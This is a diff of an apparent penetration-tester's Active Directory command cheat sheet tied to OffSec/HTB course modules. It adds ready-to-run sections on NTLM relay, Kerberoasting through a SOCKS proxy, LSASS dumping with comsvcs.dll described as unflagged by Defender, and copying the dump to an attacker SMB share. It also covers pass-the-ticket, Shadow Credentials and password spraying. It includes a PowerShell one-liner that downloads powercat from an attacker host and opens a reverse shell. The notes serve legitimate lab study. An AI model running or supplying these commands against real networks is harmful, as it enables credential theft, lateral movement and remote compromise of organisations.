@@ -2,7 +2,7 @@
 
 Pure syntax reference, phase-ordered coverage is in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]], decision logic in [[Active Directory (Decision Tree)]].
 
-Cross-links: [[Active Directory Enumeration & Attacks (HTB Supplementary)]]
+Cross-links: [[22. Active Directory Introduction and Enumeration]] (see also [[23. Attacking Active Directory Authentication]], [[24. Lateral Movement in Active Directory]])
 
 ---
 
@@ -194,7 +194,7 @@ $u = LDAPSearch -LDAPQuery "(samAccountName=michelle)"
 $u.properties
 ```
 
-Source: [[Active Directory Introduction and Enumeration#22.2.3 Adding Search Functionality to our Script|Module 22 §22.2.3]]
+Source: [[22. Active Directory Introduction and Enumeration#22.2.3 Adding Search Functionality to our Script|Module 22 §22.2.3]]
 
 ---
 
@@ -231,7 +231,7 @@ ls \\FILES04\docshare\docs\do-not-share
 cat \\FILES04\docshare\docs\do-not-share\start-email.txt
 ```
 
-Source: [[Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]]
+Source: [[22. Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]]
 
 ---
 
@@ -289,7 +289,7 @@ Invoke-Command -ComputerName client74.corp.com -Credential $cred -ScriptBlock {w
 type "\\client74\c$\Users\administrator\Desktop\proof.txt"
 ```
 
-Source: [[Active Directory Introduction and Enumeration#22.3.4 Enumerating Object Permissions|Module 22 §22.3.4 + Capstone]]
+Source: [[22. Active Directory Introduction and Enumeration#22.3.4 Enumerating Object Permissions|Module 22 §22.3.4 + Capstone]]
 
 ```powershell
 # Step 1: ForceChangePassword
@@ -320,11 +320,15 @@ Remove-DomainGroupMember -Identity 'Privileged Group' -Members '<target>' -Crede
 ## Kerberoasting
 
 ```bash
-# Linux
+# Linux (direct DC access)
 impacket-GetUserSPNs -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass -outputfile hashes.kerberoast
 # OR (older alias)
 GetUserSPNs.py -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass
 # hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+
+# Linux (via SOCKS proxy — DC only reachable internally)
+proxychains -q impacket-GetUserSPNs -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass
+# proxychains4.conf must point to your SOCKS5 proxy port (e.g. socks5 127.0.0.1 1081)
 ```
 
 ```cmd
@@ -334,7 +338,13 @@ GetUserSPNs.py -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass
 :: hashcat -m 13100
 ```
 
-> 🕐 Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN (clock jump kills OpenVPN TLS) → run impacket. Large offsets (>1 min) will drop the VPN tunnel.
+> 🕐 Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, the Kali clock is >5 min off from the DC. Fix:
+> 1. `nmap --script smb2-time <EXTERNAL_HOST>` — the `date:` field is **UTC** regardless of Kali's timezone. If Kali is in BST (UTC+1), add 1 hour to the UTC reading to get the correct local time to set.
+> 2. `sudo timedatectl set-ntp false` — stops NTP overwriting the fix.
+> 3. `sudo date -s "YYYY-MM-DD HH:MM:SS"` — set to adjusted local time.
+> 4. Sync the clock **before** establishing any Chisel/SSH tunnel — a ~1-hour clock jump kills active WebSocket/TLS sessions.
+> 5. Reconnect VPN if it dropped, then re-establish the tunnel, then run impacket.
+> Using an external dual-homed host (e.g. MAILSRV1) for smb2-time avoids proxychains and is accurate enough (domain clocks synchronise).
 
 ---
 
@@ -380,7 +390,88 @@ klist
 iwr -UseDefaultCredentials http://web04
 ```
 
-Source: [[Attacking Active Directory Authentication#23.2.4 Silver Tickets|Module 23 §23.2.4]]
+Source: [[23. Attacking Active Directory Authentication#23.2.4 Silver Tickets|Module 23 §23.2.4]]
+
+---
+
+## NTLM Relay — impacket-ntlmrelayx
+
+Relays inbound NTLM authentication to a second target. Requires: (1) a way to trigger outbound SMB/HTTP auth from a host (UNC path in app config, Responder poisoning, print spool trigger, etc.), (2) the second target has SMB signing **disabled**.
+
+```bash
+# Relay SMB auth to a single target, run a command via SCM as the relayed user
+sudo impacket-ntlmrelayx \
+  --no-http-server \
+  -smb2support \
+  -t <TARGET_IP> \
+  -c "powershell -enc <BASE64_PAYLOAD>"
+
+# Relay to multiple targets simultaneously (drop any reachable admin-level target)
+sudo impacket-ntlmrelayx -smb2support -tf targets.txt
+
+# Interactive shell mode (opens a mini SMB shell instead of running -c)
+sudo impacket-ntlmrelayx -smb2support -t <TARGET_IP> -i
+
+# Dump SAM via relay (no -c needed; ntlmrelayx does it automatically when it gains admin)
+sudo impacket-ntlmrelayx -smb2support -t <TARGET_IP>
+```
+
+Build the `-c` base64 payload (UTF-16LE encoding required for PowerShell `-enc`):
+```powershell
+$Text  = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8888/powercat.ps1');powercat -c <KALI> -p 9999 -e powershell"
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+[Convert]::ToBase64String($Bytes)
+```
+
+See [[27. Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin|Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin]] for the full chain.
+
+---
+
+## LSASS Dumping — comsvcs.dll MiniDump + pypykatz
+
+Use when Defender kills Meterpreter kiwi / sekurlsa::logonpasswords. Requires SYSTEM on target.
+
+```powershell
+# Step 1 — get LSASS PID
+Get-Process lsass
+
+# Step 2 — dump via native Windows DLL (not flagged by Defender)
+rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
+# Silent = good. Verify:
+dir C:\Windows\Temp\lsass.dmp   # → ~45-50 MB
+```
+
+```bash
+# Step 3 — transfer to Kali via authenticated smbserver (see below)
+# Step 4 — parse offline
+pypykatz lsa minidump /tmp/share/lsass.dmp
+# Look for: username, NT: <hash>, password: <cleartext>
+```
+
+See [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]] for the full walkthrough.
+
+---
+
+## impacket-smbserver — Authenticated File Transfer
+
+Port 445 must be free (kill ntlmrelayx or other SMB listeners first).
+
+```bash
+# Kali — host the share with credentials
+mkdir /tmp/share
+impacket-smbserver share /tmp/share -smb2support -username kali -password kali
+```
+
+```powershell
+# Windows target — mount and copy
+net use \\<KALI>\share /user:kali kali
+copy C:\Windows\Temp\lsass.dmp \\<KALI>\share\lsass.dmp
+
+# Or serve a file the other way (pull from Windows)
+copy \\<KALI>\share\mimikatz.exe C:\Windows\Temp\mimikatz.exe
+```
+
+> Null-auth smbserver (no `-username/-password`) is blocked by modern Windows and Defender network protection. Always use credentials in lab environments.
 
 ---
 
@@ -652,8 +743,95 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 # Output: user:RID:LM:NT::: for every domain account
 ```
 
-Source: [[Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]]
+Source: [[24. Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]]
 
 ---
 
-#### Tags: #CommandAppendix #ActiveDirectory #ADEnum #Kerberoasting #ASREPRoasting #SilverTicket #ACLAbuse #DCSync #PasswordSpray #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Module22 #Module23 #LDAPSearch #GPP #SYSVOL #DomainShares #GenericAll #LateralMovement #WMI #WinRM #PsExec #PassTheHash #OverpassTheHash #PassTheTicket #DCOM #GoldenTicket #ShadowCopy #vshadow #Module24
+## Pass the Ticket (Linux -- ccache + keytab)
+
+```bash
+# Locate ccache tickets on a Linux host
+find / -name krb5cc_* 2>/dev/null
+env | grep KRB5CCNAME
+
+# Set KRB5CCNAME to use a specific ticket
+export KRB5CCNAME=/tmp/krb5cc_0
+klist          # confirm which principal is loaded
+
+# Import ccache into the current environment (if not auto-loaded)
+export KRB5CCNAME=<path_to_ccache>
+
+# Use with impacket tools
+klist -k -t /etc/krb5.keytab                    # list keytab principals
+kinit -k -t /etc/krb5.keytab <user@DOMAIN.COM>  # get TGT from keytab
+impacket-wmiexec -k -no-pass DOMAIN.LOCAL/user@<TARGET_IP>  # use current ccache
+
+# Extract keytab credentials (if readable)
+python3 /opt/keytabextract.py /etc/krb5.keytab
+# → AES256: ...  AES128: ...  NTLM: ...
+```
+
+Source: [[23. Attacking Active Directory Authentication#23.4.2|Module 23 §23.4.2 PtT Linux]]
+
+---
+
+## Shadow Credentials (pywhisker + PKINITtools)
+
+Shadow Credentials abuses the `msDS-KeyCredentialLink` attribute. An attacker with write permissions on a target account adds a certificate key credential -- the target account can then pre-authenticate with that certificate rather than its password.
+
+```bash
+# Step 1: Add shadow credentials to a target account (requires GenericWrite or GenericAll)
+python3 pywhisker.py -d DOMAIN.LOCAL -u attacker -p pass --target TARGET_USER --action add
+# → Saves a .pfx file + prints the certificate password
+
+# Step 2: Request a TGT using the certificate (PKINITtools)
+# Fix oscrypto if needed: pip3 install -I git+https://github.com/wbond/oscrypto.git
+python3 gettgtpkinit.py DOMAIN.LOCAL/TARGET_USER -cert-pfx cert.pfx -pfx-pass <cert_pass> ccache_file.ccache
+
+# Step 3: Use the TGT to get the NT hash via U2U Kerberos request
+python3 getnthash.py DOMAIN.LOCAL/TARGET_USER -key <session_key_from_gettgtpkinit>
+
+# Step 4: Use the NT hash for PtH / PSRemoting
+evil-winrm -i <TARGET_IP> -u TARGET_USER -H <NT_hash>
+```
+
+> 💡 ADCS ESC8 relay variant: `ntlmrelayx --adcs --template DomainController` → PFX output → use same PKINITtools flow to get DC TGT → DCSync.
+
+Source: [[23. Attacking Active Directory Authentication#23.4.3|Module 23 §23.4.3 PtC/Shadow Credentials]]
+
+---
+
+## Extended Enumeration (HTB Techniques)
+
+```powershell
+# bloodhound-python -- remote collection from Linux (no agent on target needed)
+# proxychains bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
+bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all --zip
+
+# Snaffler -- find interesting files across all domain shares (-d = domain-wide search)
+.\Snaffler.exe -s -d DOMAIN.LOCAL -o snaffler.log -v data
+
+# DomainPasswordSpray.ps1 -- built-in policy-aware spraying (auto lockout protection)
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password 'Spring2024!' -OutFile spray_results.txt
+
+# PASSWD_NOTREQD accounts
+Get-DomainUser -UACFilter PASSWD_NOTREQD | select samaccountname,useraccountcontrol
+
+# Reversible encryption accounts (cleartext retrievable via DCSync)
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
+
+# Living Off the Land -- AV/EDR status
+Get-MpComputerStatus                                    # Windows Defender status
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# dsquery -- no PowerView needed, works natively on Windows Server
+dsquery user -disabled
+dsquery computer -name "DC*"
+```
+
+Source: [[22. Active Directory Introduction and Enumeration#22.6|Module 22 §22.6]] and [[24. Lateral Movement in Active Directory#24.4.1|Module 24 §24.4.1-24.4.2]]
+
+---
+
+#### Tags: #CommandAppendix #ActiveDirectory #ADEnum #Kerberoasting #ASREPRoasting #SilverTicket #ACLAbuse #DCSync #PasswordSpray #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Module22 #Module23 #LDAPSearch #GPP #SYSVOL #DomainShares #GenericAll #LateralMovement #WMI #WinRM #PsExec #PassTheHash #OverpassTheHash #PassTheTicket #DCOM #GoldenTicket #ShadowCopy #vshadow #Module24 #NTLMRelay #ntlmrelayx #comsvcs #MiniDump #pypykatz #LSASS #impacket-smbserver #Module27 #ccache #KRB5CCNAME #keytab #kinit #ShadowCredentials #pywhisker #PKINITtools #bloodhoundPython #Snaffler #DomainPasswordSpray #PASSWD_NOTREQD #ReversibleEncryption #dsquery #LivingOffTheLand
